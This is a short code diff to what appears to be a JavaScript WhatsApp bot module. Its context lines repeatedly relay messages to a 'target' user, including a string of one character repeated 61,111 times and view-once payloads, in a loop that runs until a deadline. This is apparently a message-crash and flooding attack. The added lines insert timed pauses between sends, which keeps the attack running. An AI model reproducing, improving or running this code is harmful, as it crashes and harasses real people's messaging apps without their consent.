@@ -62,6 +62,7 @@ export default {
           participant: { jid: target },
           messageId: null
         });
+        await new Promise(resolve => setTimeout(resolve, 800));
 
         const uw2 = "ꦾ".repeat(61111);
         await trim.relayMessage(target, {
@@ -115,6 +116,7 @@ export default {
         }, {
           participant: { jid: target }
         });
+        await new Promise(resolve => setTimeout(resolve, 1200));
 
         await trim.relayMessage(target, {
           viewOnceMessage: {
@@ -154,6 +156,7 @@ export default {
           messageId: null,
           participant: { jid: target }
         });
+        await new Promise(resolve => setTimeout(resolve, 600));
 
         await trim.relayMessage(target, {
           viewOnceMessage: {
@@ -171,6 +174,7 @@ export default {
           messageId: null,
           participant: { jid: target }
         });
+        await new Promise(resolve => setTimeout(resolve, 600));
       }
 
       while (Date.now() < DEADLINE) {
